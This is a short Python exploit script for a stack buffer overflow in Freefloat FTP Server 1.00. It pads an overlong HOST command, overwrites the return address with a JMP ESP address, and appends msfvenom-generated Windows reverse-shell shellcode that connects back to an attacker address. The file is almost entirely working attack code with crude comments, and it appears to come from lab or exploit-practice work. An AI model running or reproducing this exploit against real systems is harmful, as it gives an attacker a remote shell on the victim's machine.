#!/usr/bin/python
import socket
#Vulnerable App : Freefloat FTP Server
#Version : 1.00


# [*] Exact match at offset 246 Bytes

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)



#Metasploit shitcode#
#msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.8 LPORT=443 -e x86shikata_ga_nai -b "\x00\x0a\x0d" -f c
shellcode = ("\xb8\x9a\x84\xaf\x01\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x46\x12\x03\x46\x12\x83\x74\x78\x4d\xf4\x74\x69\x10"
"\xf7\x84\x6a\x75\x71\x61\x5b\xb5\xe5\xe2\xcc\x05\x6d\xa6\xe0"
"\xee\x23\x52\x72\x82\xeb\x55\x33\x29\xca\x58\xc4\x02\x2e\xfb"
"\x46\x59\x63\xdb\x77\x92\x76\x1a\xbf\xcf\x7b\x4e\x68\x9b\x2e"
"\x7e\x1d\xd1\xf2\xf5\x6d\xf7\x72\xea\x26\xf6\x53\xbd\x3d\xa1"
"\x73\x3c\x91\xd9\x3d\x26\xf6\xe4\xf4\xdd\xcc\x93\x06\x37\x1d"
"\x5b\xa4\x76\x91\xae\xb4\xbf\x16\x51\xc3\xc9\x64\xec\xd4\x0e"
"\x16\x2a\x50\x94\xb0\xb9\xc2\x70\x40\x6d\x94\xf3\x4e\xda\xd2"
"\x5b\x53\xdd\x37\xd0\x6f\x56\xb6\x36\xe6\x2c\x9d\x92\xa2\xf7"
"\xbc\x83\x0e\x59\xc0\xd3\xf0\x06\x64\x98\x1d\x52\x15\xc3\x49"
"\x97\x14\xfb\x89\xbf\x2f\x88\xbb\x60\x84\x06\xf0\xe9\x02\xd1"
"\xf7\xc3\xf3\x4d\x06\xec\x03\x44\xcd\xb8\x53\xfe\xe4\xc0\x3f"
"\xfe\x09\x15\xef\xae\xa5\xc6\x50\x1e\x06\xb7\x38\x74\x89\xe8"
"\x59\x77\x43\x81\xf0\x82\x04\x6e\xac\x8d\xdc\x06\xaf\x8d\xdd"
"\x6d\x26\x6b\xb7\x81\x6f\x24\x20\x3b\x2a\xbe\xd1\xc4\xe0\xbb"
"\xd2\x4f\x07\x3c\x9c\xa7\x62\x2e\x49\x48\x39\x0c\xdc\x57\x97"
"\x38\x82\xca\x7c\xb8\xcd\xf6\x2a\xef\x9a\xc9\x22\x65\x37\x73"
"\x9d\x9b\xca\xe5\xe6\x1f\x11\xd6\xe9\x9e\xd4\x62\xce\xb0\x20"
"\x6a\x4a\xe4\xfc\x3d\x04\x52\xbb\x97\xe6\x0c\x15\x4b\xa1\xd8"
"\xe0\xa7\x72\x9e\xec\xed\x04\x7e\x5c\x58\x51\x81\x51\x0c\x55"
"\xfa\x8f\xac\x9a\xd1\x0b\xdc\xd0\x7b\x3d\x75\xbd\xee\x7f\x18"
"\x3e\xc5\xbc\x25\xbd\xef\x3c\xd2\xdd\x9a\x39\x9e\x59\x77\x30"
"\x8f\x0f\x77\xe7\xb0\x05") #351 Bytes

# shellcode = 351 Bytes
# 7766AE9F ---> JMP ESP
Evil=246*"V" + "\x9F\xAE\x66\x77" +140* "\x90" +shellcode               #total shit : 741 Bytes

print "\nSending the shit........"
s.connect(("192.168.1.10",21))           #Victim IP address and port.
data=s.recv(1023)
s.send('HOST '+Evil+'\r\n')
s.close()
print "[All]L7oway(yasuo) : gg ez carry"
